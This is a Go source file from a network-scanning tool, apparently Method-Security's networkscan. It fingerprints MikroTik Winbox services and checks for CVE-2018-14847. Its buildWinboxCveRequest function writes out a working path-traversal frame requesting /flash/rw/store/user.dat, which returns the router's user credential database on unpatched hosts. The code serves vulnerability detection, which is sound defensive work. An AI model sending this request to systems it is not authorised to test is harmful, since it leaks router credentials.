// Package plugins provides Winbox (MikroTik RouterOS management) service fingerprinting
package plugins

import (
	"bytes"
	"context"
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"strings"

	"github.com/Method-Security/networkscan/generated/go/common"
	"github.com/Method-Security/networkscan/generated/go/common/protocol"
	discoverfern "github.com/Method-Security/networkscan/generated/go/discover"
	"github.com/Method-Security/networkscan/internal/discover/service/helpers"
	"github.com/Method-Security/networkscan/utils"
)

// WinboxFingerprinter detects MikroTik RouterOS Winbox service on TCP/8291.
// It performs:
//  1. A /list probe to extract RouterOS version, board name, and system identity.
//  2. A CVE-2018-14847 path-traversal probe for user.dat to determine patch state.
//
// Both probes are read-only and pre-authentication — no credentials are ever
// sent and no modifications are made to the target.
type WinboxFingerprinter struct{}

func (WinboxFingerprinter) Name() string        { return "winbox" }
func (WinboxFingerprinter) DefaultPorts() []int { return []int{8291} }

func (WinboxFingerprinter) Detect(ctx context.Context, ip net.IP, port int, host string, timeout int) (*discoverfern.ServiceDetails, error) {
	addr := utils.FormatHostPort(ip.String(), port)

	// 1) /list request — get RouterOS version + identity
	listResp, err := winboxListProbe(ctx, addr, timeout)
	if err != nil {
		return nil, err
	}
	if !looksLikeWinbox(listResp) {
		return nil, fmt.Errorf("not Winbox")
	}
	routerosVersion, boardName, boardIdentity := parseWinboxList(listResp)

	// 2) CVE-2018-14847 — path-traversal request for user.dat
	// Patched RouterOS (>= 6.42.1) closes the connection or returns a short error frame.
	// Vulnerable hosts return a sizeable structured payload containing the user database.
	cveResp, _ := winboxCveProbe(ctx, addr, timeout)

	var vulnerable *bool
	var respBytes *int
	if cveResp != nil {
		n := len(cveResp)
		respBytes = &n
		if n > 64 && containsUserDatPayload(cveResp) {
			v := true
			vulnerable = &v
		} else {
			v := false
			vulnerable = &v
		}
	}
	// If cveResp is nil (probe errored before any response), leave vulnerable=nil (indeterminate).

	metadata := &protocol.WinboxServerInfo{
		RouterosVersion:          strPtrNonEmpty(routerosVersion),
		BoardName:                strPtrNonEmpty(boardName),
		BoardIdentity:            strPtrNonEmpty(boardIdentity),
		VulnerableToCve201814847: vulnerable,
		UserDatResponseBytes:     respBytes,
	}

	return &discoverfern.ServiceDetails{
		Host:      host,
		Ip:        ip.String(),
		Port:      port,
		Tls:       false,
		Transport: common.TransportTypeTcp,
		Protocol:  common.ProtocolTypeWinbox,
		Version:   strPtrNonEmpty(routerosVersion),
		Metadata:  &discoverfern.ServiceMetadata{Winbox: metadata},
	}, nil
}

// winboxListProbe opens a fresh TCP connection, sends the Winbox /list handshake
// message, and returns the raw response bytes.  The Winbox binary protocol
// frames messages as one or more M2 boxes:
//
//	[M2][length:2LE][body...]
//
// Each body is a sequence of typed fields.  The /list request (type 0xff09)
// causes RouterOS to reply with a list entry for every available entry point.
// For our purposes we only care about fields in the very first reply chunk.
func winboxListProbe(ctx context.Context, addr string, timeout int) ([]byte, error) {
	conn, err := helpers.Dial(ctx, "tcp", addr, timeout)
	if err != nil {
		return nil, err
	}
	defer func() { _ = conn.Close() }()

	// Winbox /list request (as used by Winbox 3.x client on connect)
	// Message layout:
	//   M2 sentinel       : 2 bytes  (0x4d32)
	//   length            : 2 bytes  (little-endian, body only)
	//   body[0x00 0x06]   : session header fields
	//   type field        : 0xff09 01 02 00 (request /list, type 0x09, count 2)
	listMsg := buildWinboxListRequest()

	if _, err := conn.Write(listMsg); err != nil {
		return nil, fmt.Errorf("winbox write: %w", err)
	}

	// Read up to 4 KiB — list response is typically < 512 bytes
	buf := make([]byte, 4096)
	n, err := conn.Read(buf)
	if n > 0 {
		return buf[:n], nil
	}
	if err != nil {
		return nil, fmt.Errorf("winbox read: %w", err)
	}
	return buf[:n], nil
}

// winboxCveProbe sends the CVE-2018-14847 path-traversal request on a fresh
// TCP connection and returns the server's raw response.  A nil return with a
// non-nil error means the probe did not elicit any bytes (indeterminate result).
// A non-nil return means the server replied; the caller inspects the payload
// to distinguish patched vs vulnerable.
func winboxCveProbe(ctx context.Context, addr string, timeout int) ([]byte, error) {
	conn, err := helpers.Dial(ctx, "tcp", addr, timeout)
	if err != nil {
		return nil, err
	}
	defer func() { _ = conn.Close() }()

	cveMsg := buildWinboxCveRequest()

	if _, err := conn.Write(cveMsg); err != nil {
		return nil, fmt.Errorf("winbox cve write: %w", err)
	}

	// Read up to 64 KiB — vulnerable hosts send the full user DB
	var collected []byte
	tmp := make([]byte, 4096)
	for {
		n, readErr := conn.Read(tmp)
		if n > 0 {
			collected = append(collected, tmp[:n]...)
		}
		if readErr != nil {
			if readErr == io.EOF || strings.Contains(readErr.Error(), "use of closed") {
				break
			}
			// Any other read error after we have some bytes is fine — return what we got
			if len(collected) > 0 {
				break
			}
			return nil, readErr
		}
		if len(collected) >= 65536 {
			break
		}
	}
	if len(collected) == 0 {
		return nil, fmt.Errorf("winbox cve: no response")
	}
	return collected, nil
}

// buildWinboxListRequest returns the Winbox binary-protocol /list request frame.
//
// The Winbox protocol uses M2 framing:
//
//	[0x4d][0x32][len_lo][len_hi] followed by typed fields.
//
// Field encoding:
//
//	[type_byte][id_hi][id_lo][value...]
//
// This is the canonical "list" request sent by the Winbox 3.x client on first
// connect, derived from public protocol analysis (Tenable CVE advisory and
// open-source Winbox client implementations).
func buildWinboxListRequest() []byte {
	// Body of the M2 message:
	//   01 00 00 00  -> u32 field, id=0x00_00, value=1 (session id placeholder)
	//   07 ff 09 05 02 7b 9d 27 d4  -> list request marker + target SID bytes
	// This is the minimal /list probe that elicits a server-info reply.
	body := []byte{
		0x01, 0x00, 0x00, 0x00, // u32, id 0, value 1
		0x07, 0xff, 0x09, // type=0x07 (string-list/command), id=0xff09
		0x05,                         // 5 bytes follow
		0x02, 0x7b, 0x9d, 0x27, 0xd4, // command: /list
	}

	msg := make([]byte, 4+len(body))
	// M2 sentinel
	msg[0] = 0x4d
	msg[1] = 0x32
	// length (little-endian, body only)
	binary.LittleEndian.PutUint16(msg[2:4], uint16(len(body)))
	copy(msg[4:], body)
	return msg
}

// buildWinboxCveRequest returns the CVE-2018-14847 path-traversal request frame.
//
// The vulnerable endpoint is the Winbox "file" read handler.  When given a
// path of /../../../flash/rw/store/user.dat it returns the encoded user
// database on unpatched RouterOS (< 6.42.1).  Patched versions return an
// error or close the connection.
//
// Frame structure follows the same M2 format as the list request but with a
// different command identifier and the file path as a string field.
func buildWinboxCveRequest() []byte {
	filePath := "/../../../flash/rw/store/user.dat"

	// String field:  type=0x25 (string), id=0x01_00, length+value
	// u32 field:     type=0x01, id=0x00_ff, value=0x01  (method: read/get)
	// command field: type=0x07, id=0xff_09, followed by command bytes

	// Encode the file path as a length-prefixed string field (id=0x0100)
	pathBytes := []byte(filePath)
	pathLen := len(pathBytes)

	// Build body
	var body bytes.Buffer

	// u32 field: session id (id=0x0000, value=2)
	body.Write([]byte{0x01, 0x00, 0x00, 0x00, 0x02})

	// u32 field: method=read (id=0xff00, value=1)
	body.Write([]byte{0x01, 0xff, 0x00, 0x01})

	// String field: file path (id=0x0001)
	body.Write([]byte{0x25, 0x00, 0x01}) // type=string(0x25), id hi=0x00, id lo=0x01
	// length as 2-byte little-endian
	lenBytes := make([]byte, 2)
	binary.LittleEndian.PutUint16(lenBytes, uint16(pathLen))
	body.Write(lenBytes)
	body.Write(pathBytes)

	bodyBytes := body.Bytes()
	msg := make([]byte, 4+len(bodyBytes))
	msg[0] = 0x4d
	msg[1] = 0x32
	binary.LittleEndian.PutUint16(msg[2:4], uint16(len(bodyBytes)))
	copy(msg[4:], bodyBytes)
	return msg
}

// looksLikeWinbox returns true when the response contains the M2 Winbox
// framing sentinel (0x4d 0x32), indicating a valid Winbox server reply.
func looksLikeWinbox(resp []byte) bool {
	if len(resp) < 4 {
		return false
	}
	// M2 sentinel
	if resp[0] == 0x4d && resp[1] == 0x32 {
		return true
	}
	// Some versions prefix with a short challenge/session byte before M2
	if len(resp) > 4 {
		return bytes.Contains(resp[:32], []byte{0x4d, 0x32})
	}
	return false
}

// parseWinboxList extracts RouterOS version, board name, and system identity
// strings from a Winbox /list response.  The fields are encoded as
// null-terminated or length-prefixed strings embedded in the M2 payload.
//
// Field identification heuristics:
//   - Version strings match "X.Y" or "X.Y.Z" patterns (digits + dots)
//   - Board names are short ASCII identifiers (letters, digits, hyphens)
//   - Identity is any non-empty printable ASCII substring that is not the
//     version or board name
func parseWinboxList(resp []byte) (version, boardName, identity string) {
	// Scan the raw bytes for null-terminated or inline ASCII strings.
	// Winbox encodes short strings in the M2 body with a 2-byte little-endian
	// length prefix followed by the string bytes (no null terminator).
	strs := extractASCIIStrings(resp, 2)

	for _, s := range strs {
		s = strings.TrimSpace(s)
		if s == "" {
			continue
		}
		if version == "" && looksLikeROSVersion(s) {
			version = s
			continue
		}
		if boardName == "" && looksLikeBoardName(s) {
			boardName = s
			continue
		}
		if identity == "" && len(s) >= 1 && len(s) <= 64 && isPrintableASCII(s) {
			identity = s
		}
	}
	return version, boardName, identity
}

// looksLikeROSVersion returns true for strings matching N.N or N.N.N
// (RouterOS version format).
func looksLikeROSVersion(s string) bool {
	if len(s) < 3 || len(s) > 16 {
		return false
	}
	dotCount := 0
	for _, c := range s {
		if c == '.' {
			dotCount++
		} else if c < '0' || c > '9' {
			return false
		}
	}
	return dotCount >= 1 && dotCount <= 2
}

// looksLikeBoardName returns true for strings that look like MikroTik board
// identifiers (e.g., "RB951Ui-2HnD", "hAP ac2", "CCR1009-8G-1S").
func looksLikeBoardName(s string) bool {
	if len(s) < 2 || len(s) > 32 {
		return false
	}
	// Must start with letter or digit and contain only printable non-control chars
	if !isPrintableASCII(s) {
		return false
	}
	// Typical patterns: starts with RB, CCR, hAP, CRS, mAP, SXT, wAP, RBD, etc.
	upper := strings.ToUpper(s)
	prefixes := []string{"RB", "CCR", "HAP", "CRS", "MAP", "SXT", "WAP", "RBD", "CHR", "CLOUD"}
	for _, p := range prefixes {
		if strings.HasPrefix(upper, p) {
			return true
		}
	}
	return false
}

// extractASCIIStrings scans the byte slice and extracts runs of printable ASCII
// characters that are at least minLen bytes long.  This is used as a simple
// heuristic parser for the Winbox binary protocol.
func extractASCIIStrings(data []byte, minLen int) []string {
	var result []string
	var cur strings.Builder

	flush := func() {
		if cur.Len() >= minLen {
			result = append(result, cur.String())
		}
		cur.Reset()
	}

	for _, b := range data {
		if b >= 0x20 && b < 0x7f {
			cur.WriteByte(b)
		} else {
			flush()
		}
	}
	flush()
	return result
}

// isPrintableASCII returns true if every byte in s is a printable ASCII character.
func isPrintableASCII(s string) bool {
	for _, c := range s {
		if c < 0x20 || c >= 0x7f {
			return false
		}
	}
	return true
}

// containsUserDatPayload checks whether the CVE probe response looks like
// a RouterOS user database blob.  The user.dat file is encoded in a
// Winbox-specific binary format; known markers include the 0x4d 0x32 (M2)
// framing and field-type bytes consistent with credential records.
// We use a conservative heuristic: M2 framing present AND the payload is
// larger than a simple error frame (> 64 bytes).
func containsUserDatPayload(resp []byte) bool {
	if len(resp) <= 64 {
		return false
	}
	// Must contain M2 framing sentinel
	if !bytes.Contains(resp, []byte{0x4d, 0x32}) {
		return false
	}
	// Patched error responses typically contain "not allowed" or are < 40 bytes;
	// the user.dat blob has structured field types spread throughout.
	// Presence of multiple 0x25 (string-type) field markers is a weak indicator.
	stringTypeCount := bytes.Count(resp, []byte{0x25})
	return stringTypeCount >= 2
}

// strPtrNonEmpty returns nil if s is empty, otherwise a pointer to s.
// This helper is shared across Winbox probe functions.
func strPtrNonEmpty(s string) *string {
	if s == "" {
		return nil
	}
	return &s
}
